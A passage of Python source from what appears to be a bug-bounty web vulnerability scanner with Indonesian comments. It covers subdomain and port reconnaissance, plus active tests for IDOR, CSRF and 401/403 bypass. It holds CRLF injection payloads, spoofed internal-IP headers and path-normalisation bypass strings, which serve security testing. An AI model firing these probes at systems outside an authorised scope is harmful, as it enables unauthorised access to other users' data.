        pattern = re.compile(r"""<script[^>]*src=["']([^"']+)["']""", re.I)
        js_urls = []
        for page_url, page_html in pages:
            for m in pattern.finditer(page_html or ""):
                src = m.group(1).strip()
                if ".js" not in src.split("?")[0].lower():
                    continue
                full = urllib.parse.urljoin(page_url, src)
                if full.startswith(("http://", "https://")) and full not in js_urls:
                    js_urls.append(full)
        js_urls = js_urls[:RECON_JS_MAX_FILES]

        def _fetch(js_url):
            try:
                r = sess.get(js_url, timeout=10)
                if getattr(r, "status_code", None) == 200:
                    return js_url, getattr(r, "text", "") or ""
            except Exception:
                pass
            return js_url, None

        texts = {}
        by_file = {}
        endpoints = []
        for js_url, body in pmap(_fetch, js_urls):
            if body is None:
                continue
            texts[js_url] = body
            found = extract_js_endpoints(body, host)
            if found:
                by_file[js_url] = found
            for endpoint in found:
                if endpoint not in endpoints:
                    endpoints.append(endpoint)
        return {"endpoints": endpoints[:RECON_JS_MAX_ENDPOINTS],
                "texts": texts, "by_file": by_file}
    return ctx_get(ctx, ("recon_js", base_url), _harvest)

def _recon_apply_ctx(ctx, data):
    """Tulis hasil recon ke ctx supaya crawler/modul injection/js bisa memakainya."""
    if not isinstance(ctx, dict):
        return data
    ctx["recon"] = data
    ctx["recon_urls"] = list(data.get("historic_urls") or [])
    ctx["recon_param_targets"] = list(data.get("param_targets") or [])
    return data

def recon_gather(sess, base_url, ctx=None):
    """Tahap recon lengkap: subdomain, DNS brute, host probe, URL historis, port scan.

    Mengembalikan dict hasil + status per sumber. Selalu selesai tanpa exception:
    sumber yang gagal hanya tercatat sebagai status, karena laporan tidak boleh
    mengklaim target bersih saat enumerasi tidak jalan.
    """
    def _produce():
        data = {"sources": {}, "errors": [], "subdomains": [], "live_hosts": [],
                "historic_urls": [], "param_targets": [], "open_ports": [],
                "index_urls": {}, "counts": {}, "_raw_urls": []}
        host = _recon_target_host(base_url)
        if not host:
            for name in ("crtsh", "certspotter", "dnsbrute", "wayback", "commoncrawl",
                         "hostprobe", "portscan", "js"):
                data["sources"][name] = "skipped"
            return data

        subs = []
        def _run_source(item):
            name, func = item
            try:
                names, status, url = func(sess, base_url, host)
            except Exception as exc:                   # pengaman terakhir
                return name, [], _recon_timeout_status(exc), "", f"{type(exc).__name__}: {exc}"
            return name, list(names or []), status, url, ""
        for name, names, status, index_url, err in pmap(_run_source, list(recon_sources().items())):
            data["sources"][name] = status
            if err:
                data["errors"].append({"source": name, "error": err})
            if index_url:
                data["index_urls"][name] = index_url
            if not names:
                continue
            if name in ("crtsh", "certspotter"):
                # Normalisasi diulang di sini (sumber sudah melakukannya) supaya
                # jaminan "subdomain selalu di dalam scope target" tidak bergantung
                # pada kepatuhan tiap sumber yang didaftarkan di `recon_sources()`.
                for found in _recon_clean_names(names, host):
                    if found not in subs:
                        subs.append(found)
            else:
                data["_raw_urls"].extend(names)
        data["subdomains"] = sorted(subs)[:RECON_MAX_SUBDOMAINS]

        brute = recon_dns_brute(host)
        data["sources"]["dnsbrute"] = "ok" if brute else "empty"
        for found in brute:
            if found not in data["subdomains"]:
                data["subdomains"].append(found)
        data["subdomains"] = sorted(dict.fromkeys(data["subdomains"]))[:RECON_MAX_SUBDOMAINS]

        probed = list(data["subdomains"])[:RECON_MAX_HOSTS_PROBED]
        if probed:
            live = []
            for name, info in pmap(lambda n: (n, recon_probe_host(sess, n)), probed):
                if info:
                    info["name"] = name
                    live.append(info)
            data["live_hosts"] = live
            data["sources"]["hostprobe"] = "ok" if live else "empty"
        else:
            data["sources"]["hostprobe"] = "empty"

        urls = _recon_clean_urls(data["_raw_urls"], host)
        data["historic_urls"] = urls
        data["param_targets"] = recon_param_targets(urls)

        if isinstance(ctx, dict) and ctx.get("port_scan"):
            hosts = [host] + [item["name"] for item in data["live_hosts"] if item.get("name")]
            hosts = list(dict.fromkeys(hosts))[:PORT_SCAN_MAX_HOSTS]
            data["open_ports"] = recon_port_scan(hosts)
            data["sources"]["portscan"] = "ok" if data["open_ports"] else "empty"
        else:
            data["sources"]["portscan"] = "skipped"

        data["sources"]["js"] = "skipped"   # diisi modul recon (butuh hasil crawl)
        data["counts"] = {
            "subdomains": len(data["subdomains"]),
            "live_hosts": len(data["live_hosts"]),
            "historic_urls": len(data["historic_urls"]),
            "js_endpoints": 0,
            "open_ports": len(data["open_ports"]),
        }
        return data

    data = ctx_get(ctx, ("recon_result", base_url), _produce)
    return _recon_apply_ctx(ctx, data)

def scan_recon(sess, base_url, ctx=None):
    """Modul recon: laporkan hasil enumerasi + panen endpoint JS.

    Modul kerentanan tidak dijalankan di host hasil enumerasi — host hanya
    dibuktikan hidup (status/title/Server), sedangkan bahan yang dipanen dipakai
    modul lain (seed crawler + pool parameter injection).
    """
    f = FindingList(base_url); info("Recon: enumerasi subdomain, URL historis, JS...")
    data = recon_gather(sess, base_url, ctx)
    for name, status in sorted((data.get("sources") or {}).items()):
        if status in ("timeout", "error"):
            reason = "timeout" if status == "timeout" else "gagal diakses"
            warn(f"  Sumber recon '{name}' {reason} — hasil enumerasi tidak lengkap")
            f.append(("INFO", "RECON_SOURCE_SKIPPED",
                      f"Sumber recon '{name}' {reason} saat memindai {base_url}. Hasil enumerasi "
                      f"tidak lengkap — temuan kosong di laporan ini bukan bukti target bersih.",
                      None, None, "certain"), evidence_url=None)

    subs = data.get("subdomains") or []
    if subs:
        info(f"  {len(subs)} subdomain unik")
    for item in data.get("live_hosts") or []:
        title = item.get("title") or "(tanpa judul)"
        server = item.get("server") or "-"
        f.append(("INFO", "SUBDOMAIN_LIVE",
                  f"Host {item['name']} hidup (HTTP {item.get('status')}, title: '{title}', "
                  f"Server: {server}). Host ini tidak ditautkan dari halaman utama — periksa apakah "
                  f"surface ini masuk scope program dan butuh perlakuan berbeda.",
                  item.get("url"), f"Host hidup: {item['name']}"), evidence_url=item.get("url"))

    urls = data.get("historic_urls") or []
    if urls:
        indexes = data.get("index_urls") or {}
        index_url = indexes.get("wayback") or indexes.get("commoncrawl") or base_url
        warn(f"  {len(urls)} URL historis dari indeks pihak ketiga")
        f.append(("INFO", "HISTORIC_URLS",
                  f"Ditemukan {len(urls)} URL historis untuk {host_from_url(base_url)} "
                  f"(Wayback/Common Crawl): {', '.join(urls[:5])}"
                  f"{' ...' if len(urls) > 5 else ''}. Endpoint lama sering masih hidup tanpa "
                  f"autentikasi/rate limit — verifikasi manual sebelum melaporkan.",
                  index_url, f"URL historis: {len(urls)}"), evidence_url=index_url)

    js = recon_js(sess, base_url, ctx)
    by_file = js.get("by_file") or {}
    if by_file:
        data["sources"]["js"] = "ok"
        data["counts"]["js_endpoints"] = len(js.get("endpoints") or [])
        if isinstance(ctx, dict):
            ctx["js_texts"] = dict(js.get("texts") or {})
            merged = list(ctx.get("recon_param_targets") or [])
            known = [u for u, _p in merged]
            for extra in recon_param_targets(js.get("endpoints") or []):
                if extra[0] not in known:
                    merged.append(extra)
                    known.append(extra[0])
            ctx["recon_param_targets"] = merged[:RECON_PARAM_URLS]
        for js_url, endpoints in list(by_file.items())[:8]:
            info(f"  {js_url.split('/')[-1]}: {len(endpoints)} endpoint")
            f.append(("INFO", "JS_ENDPOINT",
                      f"Berkas JS {js_url.split('/')[-1]} memuat {len(endpoints)} endpoint "
                      f"(mis. {', '.join(endpoints[:5])}). Endpoint dari bundel JS sering tidak "
                      f"terdokumentasi dan bisa dipakai tanpa autentikasi.",
                      js_url, f"Endpoint JS: {len(endpoints)}"), evidence_url=js_url)
    elif js.get("texts"):
        data["sources"]["js"] = "empty"

    for host, port, service in data.get("open_ports") or []:
        risky = port in PORT_SCAN_RISKY_PORTS
        extra = (" Service ini seharusnya tidak terekspos ke internet — kalau memang terbuka, "
                 "kredensial bawaan/default config jadi sasaran langsung.") if risky else ""
        f.append(("LOW" if risky else "INFO", "PORT_OPEN",
                  f"Port {port} ({service}) terbuka di {host}.{extra}",
                  f"http://{host}:{port}/", f"Port terbuka: {host}:{port}"),
                 evidence_url=None)
    return f

def scan_subdomains(sess, base_url, ctx=None):
    """Subdomain hasil recon (bagian 3).

    Enumerasi sudah dijalankan sekali di `recon_gather` (crt.sh + Cert Spotter +
    brute force DNS internal); modul ini hanya merapikan irisannya jadi temuan.
    Target IP/localhost tidak memicu request apa pun.
    """
    f = FindingList(); info("Mencari subdomain...")
    host = _recon_target_host(base_url)
    if not host: return f
    data = recon_gather(sess, base_url, ctx)
    subs = data.get("subdomains") or []
    sources = data.get("sources") or {}
    used = [label for key, label in (("crtsh", "CRT.sh"), ("certspotter", "Cert Spotter"),
                                     ("dnsbrute", "DNS lookup"))
            if sources.get(key) == "ok"]
    f.default_evidence_url = (data.get("index_urls") or {}).get("crtsh") or base_url
    if subs:
        info(f"Ditemukan {len(subs)} subdomain")
        for s in subs[:10]: info(f"  {s}")
        if len(subs)>10: info(f"  +{len(subs)-10} lainnya")
        f.append(("INFO","SUBDOMAINS",f"Ditemukan {len(subs)} subdomain untuk {host} via "
                  f"{' + '.join(used) if used else 'sumber pasif'}. Periksa setiap subdomain untuk "
                  f"potensi serangan: {'; '.join(subs[:10])}"))
    else: info("Tidak ada subdomain ditemukan")
    return f

def scan_forms_analyze(sess, base_url, ctx=None):
    f = FindingList(); info("Menganalisis form...")
    crawler = ctx.get("crawler") if ctx else None
    if not crawler: return f
    forms = get_forms(ctx)
    if forms:
        seen = set()
        info(f"Ditemukan {len(forms)} form")
        for action,method,inputs,page in forms:
            names = [i["name"] for i in inputs if i["name"]]
            key = (action,method)
            if key in seen: continue
            seen.add(key)
            info(f"  {method} {action}: {names}")
            if any("pass" in n.lower() for n in names):
                if not action.startswith("https") and base_url.startswith("https"):
                    warn(f"Form password dikirim lewat HTTP: {action}")
                    f.append(("MEDIUM","FORM_HTTP",f"Form dengan field password di {page} mengirim data ke {action} (HTTP, bukan HTTPS). Password dikirim dalam teks mentah — bisa dicegat attacker di jaringan yang sama (WiFi publik, dll)."), evidence_url=page)
    else: info("Tidak ada form")
    return f

def waf_detect(sess, base_url, ctx=None):
    sigs = {"Cloudflare":[("server","cloudflare"),("cf-ray","")],
            "AWS WAF":[("x-amz-cf-id",""),("server","cloudfront")],
            "ModSecurity":[("server","mod_security")],
            "Akamai":[("server","akamaighost")],
            "Imperva":[("x-iinfo","")]}
    detected = []
    try:
        r = get_base_response(sess, base_url, ctx)
        if r is None:
            return detected
        h = {k.lower():v.lower() for k,v in r.headers.items()}
        for name, sigs_list in sigs.items():
            if all(h.get(hdr,"") and (not val or val in h[hdr]) for hdr,val in sigs_list): detected.append(name)
        if "attention required" in r.text.lower() and "cloudflare" in r.text.lower(): detected.append("Cloudflare")
    except: pass
    return detected

# ══════════════════════════════════════════════════════════════════
# MODUL KELAS KERENTANAN TAMBAHAN (roadmap bug bounty bagian 2)
# ══════════════════════════════════════════════════════════════════

# Path terlindungi yang lazim jadi titik uji bypass otorisasi.
AUTH_BYPASS_PATHS = ("/admin", "/admin/area", "/administrator/", "/dashboard",
                     "/api/admin", "/api/v1/admin", "/internal", "/manage", "/panel")

# Header yang lazim dipercaya reverse proxy/backend untuk menandai origin internal.
AUTH_BYPASS_HEADERS = (
    ("X-Original-URL", "/"), ("X-Rewrite-URL", "/"),
    ("X-Forwarded-For", "127.0.0.1"), ("X-Client-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"), ("X-Originating-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"), ("X-HTTP-Method-Override", "GET"),
)

API_SPEC_PATHS = ("/openapi.json", "/swagger.json", "/v3/api-docs", "/api-docs",
                  "/.well-known/openapi.json", "/api/swagger.json")

# Endpoint terlindungi yang lazim dipakai untuk menguji token JWT.
JWT_PROTECTED_PATHS = ("/api/me", "/jwt/protected", "/api/profile", "/api/v1/me",
                       "/me", "/profile", "/api/user")

# Lokasi public key / JWKS yang dipakai uji alg confusion.
JWT_KEY_PATHS = ("/jwks.pem", "/.well-known/jwks.json", "/jwks.json",
                 "/.well-known/openid-configuration")

# Nama parameter yang paling sering dipakai aplikasi (parameter discovery).
PARAM_WORDLIST = (
    "id", "page", "debug", "test", "admin", "user", "username", "email", "name",
    "q", "s", "search", "query", "filter", "sort", "order", "dir", "view", "action",
    "type", "mode", "lang", "locale", "format", "output", "file", "path", "url",
    "redirect", "next", "token", "key", "api_key", "callback", "json", "xml", "data",
    "value", "cmd", "host", "target", "template", "theme", "version", "v", "ref", "source",
)

CRLF_PAYLOADS = (
    ("%0d%0aX-Spade-Injected:1", "CRLF ganda"),
    ("%0d%0aSet-Cookie:spade=1", "CRLF + Set-Cookie"),
    ("%0d%0a%0d%0a<spade>", "response splitting"),
    ("%E5%98%8A%E5%98%8DSpade-Injected:1", "unicode CRLF"),
)

# Path kandidat khusus uji OOB (hanya dikirim saat --oob-host aktif).
OOB_SSRF_PATHS = ("/ssrf-sink", "/fetch", "/proxy", "/api/fetch", "/api/url", "/url")
OOB_XXE_PATHS = ("/xml-oob", "/api/xml", "/xml", "/soap", "/api/upload")
OOB_CMDI_PATHS = ("/ping", "/exec", "/cmd", "/run", "/api/exec")

CACHE_MARKER_HEADERS = ("X-Cache", "X-Cache-Hits", "CF-Cache-Status", "Age", "X-Cache-Status")

JWT_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
JWT_ASYM_ALGS = ("RS", "ES", "PS")

def _ctx_flag(ctx, key):
    """Baca flag boolean dari ctx tanpa pecah kalau ctx kosong/None."""
    return bool((ctx or {}).get(key))

def _resp_fingerprint(resp):
    """Sidik ringkas respons (status, ukuran, hash body) untuk perbandingan."""
    if resp is None:
        return None
    content = resp.content or b""
    return (resp.status_code, len(content), hashlib.sha256(content).hexdigest()[:16])

def _is_spa_catchall(resp, ctx):
    """True kalau respons ini cuma halaman catch-all SPA, bukan resource asli."""
    baseline = (ctx or {}).get("baseline")
    if resp is None or not baseline or baseline.get("detected") != "spa_catchall":
        return False
    if hash(resp.content) == baseline.get("content_hash"):
        return True
    return bool(baseline.get("is_html")) and len(resp.content) == baseline.get("size")

def _looks_like_login(text):
    """Heuristik halaman login: respons seperti ini bukan bukti akses tidak sah."""
    low = (text or "")[:5000].lower()
    if "type=\"password\"" in low or "type='password'" in low:
        return True
    return "<form" in low and ("login" in low or "sign in" in low or "masuk" in low)

def _object_payload(resp, ctx, ident=None):
    """True kalau respons tampak sebagai payload objek (bukan login/catch-all)."""
    if resp is None or resp.status_code not in (200, 201) or _is_spa_catchall(resp, ctx):
        return False
    text = resp.text or ""
    if _looks_like_login(text):
        return False
    ctype = (resp.headers.get("Content-Type") or "").lower()
    if "json" in ctype:
        try:
            payload = resp.json()
        except Exception:
            return False
        return bool(payload)
    if ident and ident in text and len(text) < 100000:
        return True
    return False

def _sibling_identifier(value):
    """ID tetangga dari sebuah ID numerik/UUID; None kalau nilainya bukan ID."""
    value = (value or "").strip()
    if re.fullmatch(r"[0-9]{1,9}", value):
        return str(int(value) + 1)
    if re.fullmatch(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", value):
        head, _, tail = value.rpartition("-")
        return f"{head}-{min(int(tail, 16) + 1, 0xFFFFFFFFFFFF):012x}"
    return None

def _idor_candidates(base_url, ctx):
    """Kandidat uji IDOR: (url_asli, url_tetangga, lokasi, ID yang diubah)."""
    crawler = (ctx or {}).get("crawler")
    urls = list(crawler.pages) if crawler and crawler.pages else []
    urls.append(base_url)
    for action, method, _inputs, _page in get_forms(ctx):
        if method.upper() == "GET":
            urls.append(join(base_url, action))
    out, seen = [], set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        for name, value in pairs:
            sibling = _sibling_identifier(value)
            if sibling is None:
                continue
            query = urllib.parse.urlencode([(n, sibling if n == name else v) for n, v in pairs])
            neighbor = urllib.parse.urlunparse(parsed._replace(query=query))
            if (url, neighbor) not in seen:
                seen.add((url, neighbor))
                out.append((url, neighbor, f"query '{name}'", value))
        segments = parsed.path.split("/")
        for index, segment in enumerate(segments):
            sibling = _sibling_identifier(segment)
            if sibling is None:
                continue
            replaced = list(segments)
            replaced[index] = sibling
            neighbor = urllib.parse.urlunparse(parsed._replace(path="/".join(replaced)))
            if (url, neighbor) not in seen:
                seen.add((url, neighbor))
                out.append((url, neighbor, f"path '{segment}'", segment))
    return out[:IDOR_MAX_CANDIDATES]

# ── Bodi modul kelas kerentanan tambahan (roadmap bug bounty bagian 2) ──
#
# Konvensi hasil internal modul baru di blok ini: tuple 6 elemen
#   (severity, kode, deskripsi, url_bukti, pesan_terminal, confidence)
# di mana `confidence=None` berarti "pakai default dari FINDING_META".
# Semua modul memakai ThreadLocalSession (curl_cffi) dan menghormati flag
# ctx: auth_enabled, anon_sess, active_writes, check_smuggling, oob_host.

def scan_idor(sess, base_url, ctx=None):
    """Uji otorisasi tingkat objek (IDOR/BOLA) dengan sesi autentikasi vs anonim.

    Modul ini butuh sesi autentikasi (`--cookie`/`-H`/`--bearer`). Membandingkan
    dua sesi adalah satu-satunya cara membedakan objek milik tester dari objek
    milik pengguna lain tanpa mengubah data. Tanpa sesi, modul dilewati dengan
    catatan — bukan diklaim bersih.
    """
    f = FindingList(base_url); info("Menguji IDOR/BOLA (otorisasi objek)...")
    anon = (ctx or {}).get("anon_sess")
    if not _ctx_flag(ctx, "auth_enabled") or anon is None:
        info("  (dilewati: butuh sesi autentikasi — pakai --cookie/-H/--bearer)")
        return f
    candidates = _idor_candidates(base_url, ctx)
    if not candidates:
        info("  Tidak ada URL ber-ID dari crawl — tidak ada kandidat")
        return f
    info(f"  {len(candidates)} kandidat objek diuji")

    def _probe(job):
        self_url, neighbor, where, ident = job
        try:
            authed_self = sess.get(self_url, timeout=10)
            anon_self = anon.get(self_url, timeout=10)
        except Exception:
            return []
        # Prasyarat: URL ini objek milik tester (200) dan anonim ditolak (401/403).
        if authed_self.status_code != 200 or anon_self.status_code not in (401, 403):
            return []
        if _is_spa_catchall(authed_self, ctx) or not _object_payload(authed_self, ctx, ident):
            return []
        self_fp = _resp_fingerprint(authed_self)
        anon_fp = _resp_fingerprint(anon_self)
        sibling = _sibling_identifier(ident)
        try:
            anon_neighbor = anon.get(neighbor, timeout=10)
        except Exception:
            anon_neighbor = None
        # Objek tetangga terbaca TANPA autentikasi: bukti terkuat (tidak perlu akun).
        if _object_payload(anon_neighbor, ctx, sibling) and _resp_fingerprint(anon_neighbor) not in (anon_fp, self_fp):
            return [("HIGH", "IDOR_ANON",
                     f"Objek tetangga dari {where} dapat dibaca tanpa autentikasi di {neighbor}, padahal objek "
                     f"pada URL aslinya menolak anonim (HTTP {anon_self.status_code}). Server tidak memeriksa "
                     f"kepemilikan objek sebelum mengembalikan data, jadi siapa pun bisa membaca data pengguna "
                     f"lain hanya dengan mengubah ID.",
                     neighbor, f"IDOR/BOLA akses anonim: {neighbor}", "firm")]
        try:
            authed_neighbor = sess.get(neighbor, timeout=10)
        except Exception:
            return []
        # Objek tetangga terbaca sesi tester, anonim ditolak: curiga kuat, verifikasi manual.
        if _object_payload(authed_neighbor, ctx, sibling) and _resp_fingerprint(authed_neighbor) != self_fp:
            return [("MEDIUM", "IDOR_READ",
                     f"Objek lain lewat {where} ({neighbor}) mengembalikan payload berbeda dari objek tester "
                     f"meski anonim ditolak (HTTP {anon_self.status_code}). Kalau objek itu bukan milik akun "
                     f"tester, ini IDOR/BOLA — perlu dicek manual dengan akun kedua.",
                     neighbor, f"Curiga IDOR: {neighbor}", "tentative")]
        return []

    seen = set()
    for out in pmap(_probe, candidates):
        for sev, code, desc, url, message, confidence in out:
            if (code, url) in seen:
                continue
            seen.add((code, url))
            warn(message)
            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
    return f

# Token anti-CSRF yang lazim dipakai framework (name/id field form).
CSRF_TOKEN_RE = re.compile(r"(csrf|xsrf|authenticity|antiforgery|_token|nonce)", re.I)

def _form_payload(inputs, overrides=None):
    """Rakit body form dari input hasil parser (field file dilewati)."""
    data = OrderedDict()
    for inp in inputs or ():
        name = inp.get("name")
        if not name or inp.get("type") == "file":
            continue
        data[name] = overrides[name] if overrides and name in overrides else (inp.get("value") or "spade")
    return dict(data)

def scan_csrf(sess, base_url, ctx=None):
    """Cari form POST rentan CSRF.

    Cek pasif (selalu jalan): form POST tanpa field token = indikasi `CSRF_NO_TOKEN`
    (confidence tentative). Cek aktif — kirim submit dengan token palsu + header
    `Origin`/`Referer` asing — hanya jalan dengan `--active-writes` karena mengirim
    POST ke aplikasi target.
    """
    f = FindingList(base_url); info("Menguji proteksi CSRF...")
    forms = [form for form in get_forms(ctx) if form[1].upper() == "POST"]
    if not forms:
        info("  Tidak ada form POST dari crawl")
        return f
    active = _ctx_flag(ctx, "active_writes")
    info(f"  {len(forms)} form POST diperiksa" + ("" if active else " (uji aktif dengan token palsu: tambah --active-writes)"))

    def _inspect(job):
        action, inputs, page = job
        if any((inp.get("type") == "password") for inp in inputs):
            return []      # form login: bukan bukti CSRF
        token_fields = [inp["name"] for inp in inputs if inp.get("name") and CSRF_TOKEN_RE.search(inp["name"])]
        if not token_fields:
            return [("MEDIUM", "CSRF_NO_TOKEN",
                     f"Form POST di {page} (action: {action}) tidak punya field token anti-CSRF. Kalau form ini "
                     f"mengubah state dan autentikasi hanya lewat cookie, situs lain bisa mengirimkan form ini "
                     f"atas nama korban (CSRF).",
                     action, f"Form POST tanpa token CSRF: {action}", "tentative")]
        if not active:
            return []
        headers = {"Origin": "https://spade-invalid.example", "Referer": "https://spade-invalid.example/"}
        try:
            valid_resp = sess.post(action, data=_form_payload(inputs), headers=headers, timeout=10)
            forged_resp = sess.post(action, data=_form_payload(inputs, {n: "spade-forged-token" for n in token_fields}),
                                    headers=headers, timeout=10)
        except Exception:
            return []
        accepted = (200, 201, 204, 302)
        if forged_resp.status_code not in accepted or valid_resp.status_code not in accepted:
            return []      # token palsu ditolak: proteksi CSRF bekerja
        if _resp_fingerprint(forged_resp) != _resp_fingerprint(valid_resp):
            return []      # respons berbeda: kemungkinan besar ditolak
        if _looks_like_login(forged_resp.text):
            return []
        return [("MEDIUM", "CSRF_TOKEN_IGNORED",
                 f"Form POST di {page} (action: {action}) memang mengirim field token ({', '.join(token_fields)}) "
                 f"tapi server menerima nilai palsu dengan respons identik. Token tidak benar-benar divalidasi, "
                 f"jadi proteksi CSRF-nya kosong.",
                 action, f"Token CSRF diabaikan server: {action}", "firm")]

    for out in pmap(_inspect, [(action, inputs, page) for action, _method, inputs, page in forms]):
        for sev, code, desc, url, message, confidence in out:
            if code == "CSRF_TOKEN_IGNORED":
                warn(message)
            else:
                info(message)
            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
    return f
def _http_origin(base_url):
    """Origin (scheme://host) dari sebuah URL."""
    parsed = urllib.parse.urlparse(base_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def _auth_bypass_variants(base_url, denied_url):
    """Varian normalisasi path yang lazim melewati ACL reverse proxy."""
    parsed = urllib.parse.urlparse(denied_url)
    path = parsed.path or "/"
    clean = "/" + path.lstrip("/")
    trimmed = clean.rstrip("/") or "/"
    variants = [
        ("trailing slash", clean if clean.endswith("/") else clean + "/"),
        ("trailing dot", trimmed + "/."),
        ("semicolon segment", trimmed + "/..;/"),
        ("double slash", "//" + clean.lstrip("/")),
        ("dot segment", clean.replace("/", "/./", 1)),
        ("encoded dot", clean.replace("/", "/%2e/", 1)),
        ("dot json", trimmed + ".json"),
        ("trailing space", clean + "%20"),
        ("semicolon suffix", trimmed + "/;/"),
    ]
    out, seen = [], set()
    for label, candidate in variants:
        if candidate == path or candidate in seen:
            continue
        seen.add(candidate)
        suffix = f"?{parsed.query}" if parsed.query else ""
        out.append((label, _http_origin(base_url) + candidate + suffix))
    return out

def scan_auth_bypass(sess, base_url, ctx=None):
    """Cari bypass otorisasi (401/403 bypass) lewat header internal dan normalisasi path.

    Kandidat = URL yang ditolak untuk sesi anonim (401/403) dan bukan halaman login.
    Kalau varian header (`X-Original-URL`, `X-Forwarded-For: 127.0.0.1`, ...) atau
    varian path (`..;/`, `//`, `%2e/`, ...) mengembalikan 200 dengan isi berbeda dari
    body penolakan, ACL-nya bisa dilewati.
    """
    f = FindingList(base_url); info("Menguji auth bypass (bypass 401/403)...")
    anon = (ctx or {}).get("anon_sess") or sess
    candidates = [join(base_url, path) for path in AUTH_BYPASS_PATHS]
    crawler = (ctx or {}).get("crawler")
    if crawler and crawler.pages:
        candidates.extend(list(crawler.pages)[:3])

    denied = []
    for url in candidates:
        if len(denied) >= AUTH_BYPASS_MAX_PATHS:
            break
        try:
            resp = anon.get(url, timeout=10)
        except Exception:
            continue
        if resp.status_code in (401, 403) and not _looks_like_login(resp.text):
            denied.append((url, resp))
    if not denied:
        info("  Tidak ada path terproteksi (401/403) untuk diuji")
        return f
    info(f"  {len(denied)} path terproteksi diuji "
         f"({len(AUTH_BYPASS_HEADERS)} varian header, 9 varian path)")

    def _accepted(resp, denial_fp):
        """True kalau respons ini bukti ACL terlewati (bukan login/SPA/body penolakan)."""
        if resp is None or resp.status_code not in (200, 201, 204):
            return False
        if _looks_like_login(resp.text) or _is_spa_catchall(resp, ctx):
            return False
        return _resp_fingerprint(resp) != denial_fp

    def _check_header(job):
        url, denial_fp, name, value = job
        try:
            resp = anon.get(url, headers={name: value}, timeout=10)
        except Exception:
            return []
        if not _accepted(resp, denial_fp):
            return []
        return [("HIGH", "AUTH_BYPASS_HEADER",
                 f"Halaman terproteksi {url} menolak akses anonim (401/403), tapi header '{name}: {value}' "
                 f"membuat server mengembalikan konten. Reverse proxy/backend mempercayai header penanda "
                 f"origin internal yang bisa dipalsukan siapa pun — autentikasi bisa dilewati.",
                 url, f"Auth bypass via header {name}: {url}", "firm")]

    def _check_path(job):
        url, denial_fp, label = job
        try:
            resp = anon.get(url, timeout=10)
        except Exception:
            return []
        if not _accepted(resp, denial_fp):
            return []
        return [("HIGH", "AUTH_BYPASS_PATH",
                 f"Halaman terproteksi {url} bisa diakses anonim dengan varian path ({label}). "
                 f"Reverse proxy dan aplikasi menormalkan path berbeda-beda, sehingga aturan ACL "
                 f"dilewati tanpa autentikasi.",
                 url, f"Auth bypass via normalisasi path ({label}): {url}", "firm")]

    header_jobs, path_jobs = [], []
    for url, denial in denied:
        denial_fp = _resp_fingerprint(denial)
        header_jobs.extend((url, denial_fp, name, value) for name, value in AUTH_BYPASS_HEADERS)
        path_jobs.extend((variant, denial_fp, label) for label, variant in _auth_bypass_variants(base_url, url))

    seen = set()
    for out in list(pmap(_check_header, header_jobs)) + list(pmap(_check_path, path_jobs)):
        for sev, code, desc, url, message, confidence in out:
            if (code, url) in seen:
                continue
            seen.add((code, url))
            warn(message)
            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
    return f

def _json_object(resp):
    """Body JSON dict dari sebuah respons, atau None kalau bukan JSON objek."""
    if resp is None or resp.status_code != 200:
        return None
    text = resp.text or ""
    ctype = (resp.headers.get("Content-Type") or "").lower()
    if "json" not in ctype and not text.lstrip().startswith("{"):
        return None
    try:
        payload = resp.json()
    except Exception:
        return None
    return payload if isinstance(payload, dict) else None

def _is_api_spec(payload):
    """True kalau dokumen JSON ini spesifikasi API (OpenAPI/Swagger)."""
    return isinstance(payload, dict) and any(key in payload for key in ("openapi", "swagger", "paths", "swaggerVersion"))

def _spec_endpoints(spec):
    """Panen path + nama parameter dari dokumen OpenAPI/Swagger."""
    endpoints, params = [], []
    paths = spec.get("paths")
    if not isinstance(paths, dict):
        return endpoints, params
    for path, operations in paths.items():
        if isinstance(path, str):
            endpoints.append(path)
        if not isinstance(operations, dict):
            continue
        for operation in operations.values():
            if not isinstance(operation, dict):
                continue
            for param in operation.get("parameters") or ():
                if isinstance(param, dict) and param.get("name"):
                    params.append(str(param["name"]))
            body = operation.get("requestBody")
            content = body.get("content") if isinstance(body, dict) else None
            if isinstance(content, dict):
                for media in content.values():
                    schema = media.get("schema") if isinstance(media, dict) else None
                    properties = schema.get("properties") if isinstance(schema, dict) else None
                    if isinstance(properties, dict):
                        params.extend(str(name) for name in properties)
    return endpoints, params

def scan_api_specs(sess, base_url, ctx=None):
    """Cari dokumen spesifikasi API (OpenAPI/Swagger) yang terekspos.

    Selain melaporkan `API_SPEC_EXPOSED`, modul ini memanen daftar endpoint dan nama
    parameter ke `ctx["api_endpoints"]`/`ctx["api_params"]` supaya modul injection
    (SQLi/XSS/LFI) ikut menguji parameter yang tidak muncul di HTML.
    """
    f = FindingList(base_url); info("Mencari spesifikasi API (OpenAPI/Swagger)...")

    def _probe(path):
        url = join(base_url, path)
        try:
            resp = sess.get(url, timeout=10)
        except Exception:
            return None
        if _is_spa_catchall(resp, ctx) or _looks_like_login(resp.text):
            return None
        spec = _json_object(resp)
        if spec is None or not _is_api_spec(spec):
            return None
        return url, spec

    for result in pmap(_probe, API_SPEC_PATHS):
        if result is None:
            continue
        url, spec = result
        endpoints, params = _spec_endpoints(spec)
        if isinstance(ctx, dict):
            if endpoints:
                ctx["api_endpoints"] = list(dict.fromkeys(endpoints))[:50]
            if params:
                ctx["api_params"] = list(dict.fromkeys(params))[:50]
        warn(f"Spesifikasi API terekspos: {url}")
        f.append(("MEDIUM", "API_SPEC_EXPOSED",
                  f"Dokumen spesifikasi API dapat diakses publik di {url}. Dokumen ini membocorkan daftar "
                  f"endpoint ({len(endpoints)} path) dan nama parameter yang dipakai server — bahan langsung "
                  f"untuk mencari endpoint tanpa autentikasi atau parameter tersembunyi.",
                  url, f"Spesifikasi API terekspos: {url}", "firm"), evidence_url=url)
        break
    return f

def spec_injection_targets(ctx):
